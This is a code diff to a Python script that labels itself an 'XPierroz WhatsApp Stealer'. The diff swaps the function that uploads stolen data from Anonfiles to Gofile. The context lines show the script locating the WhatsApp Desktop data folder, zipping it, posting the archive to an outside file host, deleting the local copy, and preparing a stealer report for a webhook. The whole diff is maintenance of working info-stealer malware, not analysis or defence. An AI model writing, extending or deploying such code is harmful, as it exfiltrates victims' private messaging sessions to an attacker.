@@ -11,7 +11,7 @@ WEBHOOK = "xpierroz on top"
 direct = f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
 print(direct)
 
-def uploadToAnonfiles(path):
+def uploadToGofile(path):
     for x in range(10):
         try:
             rr = requests.post(
@@ -30,7 +30,7 @@ try:
 except Exception: 
     pass
 
-m = uploadToAnonfiles(f"{os.getcwd()}\\ssouput.zip")
+m = uploadToGofile(f"{os.getcwd()}\\ssouput.zip")
 os.remove(f"{os.getcwd()}\\ssouput.zip")
 
 message = f"**XPierroz WhatsApp Stealer Report**\n\n"
